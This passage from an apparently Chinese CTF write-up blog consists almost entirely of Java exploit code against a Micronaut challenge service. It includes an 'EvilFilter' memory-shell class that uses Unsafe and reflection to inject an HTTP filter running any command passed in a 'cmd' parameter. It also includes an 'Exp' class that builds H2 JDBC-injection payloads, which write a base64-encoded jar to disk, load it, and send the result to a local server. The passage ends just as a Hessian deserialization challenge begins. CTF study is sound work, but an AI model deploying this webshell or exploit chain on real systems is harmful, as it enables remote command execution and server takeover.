class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> micronaut.poc;<br><br><span class="hljs-keyword">import</span> io.micronaut.core.propagation.PropagatedContextElement;<br><span class="hljs-keyword">import</span> io.micronaut.core.util.SupplierUtil;<br><span class="hljs-keyword">import</span> io.micronaut.http.HttpRequest;<br><span class="hljs-keyword">import</span> io.micronaut.http.MutableHttpResponse;<br><span class="hljs-keyword">import</span> io.micronaut.http.filter.*;<br><span class="hljs-keyword">import</span> io.micronaut.http.server.RouteExecutor;<br><span class="hljs-keyword">import</span> io.micronaut.http.server.netty.NettyHttpRequest;<br><span class="hljs-keyword">import</span> io.micronaut.web.router.DefaultRouter;<br><span class="hljs-keyword">import</span> io.netty.util.internal.InternalThreadLocalMap;<br><span class="hljs-keyword">import</span> org.reactivestreams.Publisher;<br><span class="hljs-keyword">import</span> reactor.core.publisher.Flux;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.function.Supplier;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilFilter</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hacked</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 获取Unsafe实例</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br><br>            <span class="hljs-comment">// 获取当前线程 (假设线程类型是NettyThreadFactory$NonBlockingFastThreadLocalThread)</span><br>            <span class="hljs-type">Thread</span> <span class="hljs-variable">currentThread</span> <span class="hljs-operator">=</span> Thread.currentThread();<br><br>            <span class="hljs-comment">// 检查是否是Netty的线程类型</span><br>            <span class="hljs-keyword">if</span> (currentThread.getClass().getName().contains(<span class="hljs-string">&quot;NettyThreadFactory$NonBlockingFastThreadLocalThread&quot;</span>)) &#123;<br>                <span class="hljs-comment">// 获取threadLocalMap字段的偏移量</span><br>                <span class="hljs-type">Field</span> <span class="hljs-variable">threadLocalMapField</span> <span class="hljs-operator">=</span> currentThread.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;threadLocalMap&quot;</span>);<br>                <span class="hljs-type">long</span> <span class="hljs-variable">threadLocalMapOffset</span> <span class="hljs-operator">=</span> unsafe.objectFieldOffset(threadLocalMapField);<br><br>                <span class="hljs-comment">// 使用Unsafe获取threadLocalMap字段的值</span><br>                <span class="hljs-type">InternalThreadLocalMap</span> <span class="hljs-variable">threadLocalMap</span> <span class="hljs-operator">=</span> (InternalThreadLocalMap) unsafe.getObject(currentThread, threadLocalMapOffset);<br><br>                <span class="hljs-comment">// 获取threadLocalMap中的indexedVariables</span><br>                <span class="hljs-type">Field</span> <span class="hljs-variable">indexedVariablesField</span> <span class="hljs-operator">=</span> InternalThreadLocalMap.class.getDeclaredField(<span class="hljs-string">&quot;indexedVariables&quot;</span>);<br>                indexedVariablesField.setAccessible(<span class="hljs-literal">true</span>);<br>                Object[] indexedVariables = (Object[]) indexedVariablesField.get(threadLocalMap);<br><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">indexedVariable</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                <span class="hljs-comment">// 遍历indexedVariables数组，寻找PropagatedContextImpl类型的变量</span><br>                <span class="hljs-keyword">for</span> (Object variable : indexedVariables) &#123;<br>                    System.out.println(variable.getClass().getName());<br>                    <span class="hljs-keyword">if</span> (variable.getClass().getName().contains(<span class="hljs-string">&quot;PropagatedContextImpl&quot;</span>)) &#123;<br>                        indexedVariable = variable;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-comment">// 如果找到了PropagatedContextImpl类型的变量</span><br>                <span class="hljs-keyword">if</span> (indexedVariable != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-comment">// 获取PropagatedContextImpl的elements属性</span><br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">elementsField</span> <span class="hljs-operator">=</span> indexedVariable.getClass().getDeclaredField(<span class="hljs-string">&quot;elements&quot;</span>);<br>                    elementsField.setAccessible(<span class="hljs-literal">true</span>);<br>                    PropagatedContextElement[] elements = (PropagatedContextElement[]) elementsField.get(indexedVariable);<br><br>                    <span class="hljs-type">PropagatedContextElement</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> elements[<span class="hljs-number">0</span>];<br><br>                    <span class="hljs-comment">// 反射获取element的httpRequest属性</span><br>                    <span class="hljs-keyword">if</span> (element != <span class="hljs-literal">null</span> &amp;&amp; element.getClass().getName().contains(<span class="hljs-string">&quot;ServerHttpRequestContext&quot;</span>)) &#123;<br>                        <span class="hljs-comment">// 获取ServerHttpRequestContext类中的httpRequest字段</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">httpRequestField</span> <span class="hljs-operator">=</span> element.getClass().getDeclaredField(<span class="hljs-string">&quot;httpRequest&quot;</span>);<br>                        httpRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">NettyHttpRequest</span> <span class="hljs-variable">httpRequest</span> <span class="hljs-operator">=</span> (NettyHttpRequest) httpRequestField.get(element);<br><br>                        <span class="hljs-comment">// 获取channelHandlerContext属性</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">channelHandlerContextField</span> <span class="hljs-operator">=</span> NettyHttpRequest.class.getDeclaredField(<span class="hljs-string">&quot;channelHandlerContext&quot;</span>);<br>                        channelHandlerContextField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">channelHandlerContext</span> <span class="hljs-operator">=</span> channelHandlerContextField.get(httpRequest);<br><br>                        <span class="hljs-comment">// 获取handler属性</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">handlerField</span> <span class="hljs-operator">=</span> channelHandlerContext.getClass().getDeclaredField(<span class="hljs-string">&quot;handler&quot;</span>);<br>                        handlerField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> handlerField.get(channelHandlerContext);<br><br>                        <span class="hljs-comment">// 获取requestHandler属性</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">requestHandlerField</span> <span class="hljs-operator">=</span> handler.getClass().getDeclaredField(<span class="hljs-string">&quot;requestHandler&quot;</span>);<br>                        requestHandlerField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">requestHandler</span> <span class="hljs-operator">=</span> requestHandlerField.get(handler);<br><br>                        <span class="hljs-comment">// 获取routeExecutor属性</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">routeExecutorField</span> <span class="hljs-operator">=</span> requestHandler.getClass().getDeclaredField(<span class="hljs-string">&quot;routeExecutor&quot;</span>);<br>                        routeExecutorField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">RouteExecutor</span> <span class="hljs-variable">routeExecutor</span> <span class="hljs-operator">=</span> (RouteExecutor) routeExecutorField.get(requestHandler);<br><br>                        <span class="hljs-comment">// 获取router属性</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">routerField</span> <span class="hljs-operator">=</span> routeExecutor.getClass().getDeclaredField(<span class="hljs-string">&quot;router&quot;</span>);<br>                        routerField.setAccessible(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-type">DefaultRouter</span> <span class="hljs-variable">router</span> <span class="hljs-operator">=</span> (DefaultRouter) routerField.get(routeExecutor);<br><br>                        <span class="hljs-comment">// 获取alwaysMatchesHttpFilters属性</span><br>                        <span class="hljs-type">Field</span> <span class="hljs-variable">alwaysMatchesHttpFiltersField</span> <span class="hljs-operator">=</span> router.getClass().getDeclaredField(<span class="hljs-string">&quot;alwaysMatchesHttpFilters&quot;</span>);<br>                        alwaysMatchesHttpFiltersField.setAccessible(<span class="hljs-literal">true</span>);<br>                        Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt; alwaysMatchesHttpFilters =<br>                                (Supplier&lt;ArrayList&lt;GenericHttpFilter&gt;&gt;) unsafe.getObject(router,<br>                                        unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField));<br><br>                        <span class="hljs-comment">// 获取现有的过滤器列表</span><br>                        ArrayList&lt;GenericHttpFilter&gt; filters = alwaysMatchesHttpFilters.get();<br><br>                        <span class="hljs-comment">// 创建新的过滤器</span><br>                        <span class="hljs-type">HttpServerFilter</span> <span class="hljs-variable">hackedFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerFilter</span>() &#123;<br>                            <span class="hljs-meta">@Override</span><br>                            <span class="hljs-keyword">public</span> Publisher&lt;MutableHttpResponse&lt;?&gt;&gt; doFilter(HttpRequest&lt;?&gt; request, ServerFilterChain chain) &#123;<br>                                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameters().get(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                                <span class="hljs-keyword">try</span> &#123;<br>                                    <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                                    <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                                    <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                                        isLinux = <span class="hljs-literal">false</span>;<br>                                    &#125;<br>                                    String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>                                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                                    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                                    output = s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                                &#125; <span class="hljs-keyword">catch</span> (IOException ioe) &#123;<br>                                    ioe.printStackTrace();<br>                                &#125;<br><br>                                <span class="hljs-type">String</span> <span class="hljs-variable">finalOutput</span> <span class="hljs-operator">=</span> output;<br>                                <span class="hljs-keyword">return</span> Flux.from(chain.proceed(request))<br>                                        .doOnNext(response -&gt; &#123;<br>                                            response.body(finalOutput);<br>                                        &#125;);<br>                            &#125;<br>                        &#125;;<br><br>                        <span class="hljs-comment">// 获取AroundLegacyFilter类</span><br>                        Class&lt;?&gt; aroundLegacyFilterClass = Class.forName(<span class="hljs-string">&quot;io.micronaut.http.filter.AroundLegacyFilter&quot;</span>);<br><br>                        <span class="hljs-comment">// 使用Unsafe分配AroundLegacyFilter的实例</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">legacyFilter</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(aroundLegacyFilterClass);<br><br>                        <span class="hljs-comment">// 获取AroundLegacyFilter的构造函数</span><br>                        Constructor&lt;?&gt; constructor = aroundLegacyFilterClass.getDeclaredConstructor(HttpFilter.class, FilterOrder.class);<br>                        constructor.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// 允许访问私有构造方法</span><br><br>                        <span class="hljs-comment">// 创建一个Dynamic FilterOrder实例，回退排序值为0</span><br>                        <span class="hljs-type">FilterOrder</span> <span class="hljs-variable">dynamicOrder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterOrder</span>.Dynamic(<span class="hljs-number">0</span>);<br><br>                        <span class="hljs-comment">// 调用构造函数初始化实例</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">aroundLegacyFilter</span> <span class="hljs-operator">=</span> constructor.newInstance(hackedFilter, dynamicOrder);<br><br>                        <span class="hljs-comment">// 将新的filter添加到filters列表中</span><br>                        filters.add((GenericHttpFilter) aroundLegacyFilter);<br><br>                        <span class="hljs-comment">// 更新alwaysMatchesHttpFilters</span><br>                        unsafe.putObject(router, unsafe.objectFieldOffset(alwaysMatchesHttpFiltersField),<br>                                SupplierUtil.memoized(() -&gt; filters));<br><br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        System.out.println(<span class="hljs-string">&quot;element不是ServerHttpRequestContext类型。&quot;</span>);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    System.out.println(<span class="hljs-string">&quot;未找到类型为PropagatedContextImpl的变量。&quot;</span>);<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;当前线程不是Netty的线程类型。&quot;</span>);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> hello.micronaut;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.google.gson.Gson;<br><span class="hljs-keyword">import</span> com.google.gson.GsonBuilder;<br><span class="hljs-keyword">import</span> hello.micronaut.bean.User;<br><span class="hljs-keyword">import</span> hello.micronaut.utils.BeanUtil;<br><span class="hljs-keyword">import</span> io.micronaut.http.HttpRequest;<br><span class="hljs-keyword">import</span> io.micronaut.http.HttpResponse;<br><span class="hljs-keyword">import</span> io.micronaut.http.MediaType;<br><span class="hljs-keyword">import</span> io.micronaut.http.client.HttpClient;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-comment">//        String loadClassName = &quot;micronaut.poc.TestPoc&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;micronaut.poc.EvilFilter&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/tmp/b.jar&quot;</span>;<br><span class="hljs-comment">//        String loadClassMethodName = &quot;poc&quot;;</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassMethodName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hacked&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">loadClassPoc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[n=&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,d=new(&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,new(&#x27;cn.hutool.db.ds.pooled.DbConfig&#x27;,&#x27;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS LOAD_JAR AS \\&#x27;void loadJar(String jarPath, String className, String methodName) throws Exception &#123;java.net.URL jarUrl = new java.net.URL(\\\&quot;file:\\\&quot; + jarPath)\\;java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;jarUrl&#125;)\\;Class&lt;?&gt; loadedClass = classLoader.loadClass(className)\\;Object instance = loadedClass.getDeclaredConstructor().newInstance()\\;java.lang.reflect.Method method = loadedClass.getMethod(methodName)\\;method.invoke(instance)\\;&#125;\\&#x27;\\;CALL LOAD_JAR(\\&#x27;&quot;</span> + loadClassPath + <span class="hljs-string">&quot;\\&#x27;, \\&#x27;&quot;</span> + loadClassName + <span class="hljs-string">&quot;\\&#x27;, \\&#x27;&quot;</span> + loadClassMethodName + <span class="hljs-string">&quot;\\&#x27;)\\;&#x27;,&#x27;1111&#x27;,&#x27;111&#x27;)),u=&#x27;cn.hutool.db.ds.pooled.PooledConnection&#x27;]&quot;</span>;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jar2base64Path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/Users/a1234/data/codes/java/micronaut-poc/target/original-micronaut-poc-0.1.jar&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jar2base64</span> <span class="hljs-operator">=</span> jar2base64(jar2base64Path);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">writeJarPoc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[n=&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,d=new(&#x27;cn.hutool.db.ds.pooled.PooledDataSource&#x27;,new(&#x27;cn.hutool.db.ds.pooled.DbConfig&#x27;,&#x27;jdbc:h2:mem:test;MODE=MSSQLServer;INIT=CREATE ALIAS IF NOT EXISTS BASE64_TO_JAR AS \\&#x27;void base64ToJar(String base64Data, String filePath) throws java.io.IOException &#123;byte[] jarBytes = java.util.Base64.getDecoder().decode(base64Data)\\;try (java.io.FileOutputStream fos = new java.io.FileOutputStream(filePath)) &#123;fos.write(jarBytes)\\;&#125;&#125;\\&#x27;\\;CALL BASE64_TO_JAR (\\&#x27;&quot;</span> + jar2base64 + <span class="hljs-string">&quot;\\&#x27;,\\&#x27;&quot;</span> + loadClassPath + <span class="hljs-string">&quot;\\&#x27;)\\;&#x27;,&#x27;1111&#x27;,&#x27;111&#x27;)),u=&#x27;cn.hutool.db.ds.pooled.PooledConnection&#x27;]&quot;</span>;<br>        <br>        <span class="hljs-type">Gson</span> <span class="hljs-variable">gson</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GsonBuilder</span>()<br>                .create();<br><br>        <span class="hljs-type">BeanUtil</span> <span class="hljs-variable">beanUtil</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanUtil</span>();<br>        beanUtil.setUrl(<span class="hljs-string">&quot;http&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> gson.toJson(beanUtil, BeanUtil.class);<br>        System.out.println(json);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc1</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(json.getBytes()) + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + writeJarPoc + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + <span class="hljs-string">&quot;admin&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc2</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(json.getBytes()) + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + loadClassPoc + <span class="hljs-string">&quot;&lt;---&gt;&quot;</span> + <span class="hljs-string">&quot;admin&quot;</span>;<br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">poc1User</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, Base64.getEncoder().encodeToString(poc1.getBytes()));<br>        <span class="hljs-type">User</span> <span class="hljs-variable">poc2User</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>, Base64.getEncoder().encodeToString(poc2.getBytes()));<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>        System.out.println(objectMapper.writeValueAsString(poc1User));<br>        System.out.println(<span class="hljs-string">&quot;send1&quot;</span>);<br>        sendPostRequest(<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="hljs-string">&quot;/hello/user&quot;</span>, objectMapper.writeValueAsString(poc1User));<br>        System.out.println(<span class="hljs-string">&quot;send2&quot;</span>);<br>        sendPostRequest(<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="hljs-string">&quot;/hello/user&quot;</span>, objectMapper.writeValueAsString(poc2User));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">jar2base64</span><span class="hljs-params">(String jarPath)</span> &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">jarFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(jarPath);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(jarFile)) &#123;<br>            <span class="hljs-type">byte</span>[] jarBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[(<span class="hljs-type">int</span>) jarFile.length()];<br>            fis.read(jarBytes);<br>            <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(jarBytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sendGetRequest</span><span class="hljs-params">(String url, String endpoint)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">HttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClient.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url))) &#123;<br>            HttpRequest&lt;String&gt; request = HttpRequest.GET(endpoint);<br>            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);<br>            <span class="hljs-keyword">return</span> response.body();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sendPostRequest</span><span class="hljs-params">(String url, String endpoint, String data)</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">HttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClient.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url))) &#123;<br>            HttpRequest&lt;String&gt; request = HttpRequest.POST(endpoint, data)<br>                    .contentType(MediaType.APPLICATION_JSON); <span class="hljs-comment">// 设置 Content-Type 头</span><br>            HttpResponse&lt;String&gt; response = httpClient.toBlocking().exchange(request, String.class);<br>            <span class="hljs-keyword">return</span> response.body();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="SU-ez-solon"><a href="#SU-ez-solon" class="headerlink" title="SU_ez_solon"></a>SU_ez_solon</h2><p>单纯的找链子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IndexController</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Mapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(<span class="hljs-meta">@Param(defaultValue = &quot;hello&quot;)</span> String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(data);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode));<br>        <span class="hljs-type">Object</span> <span 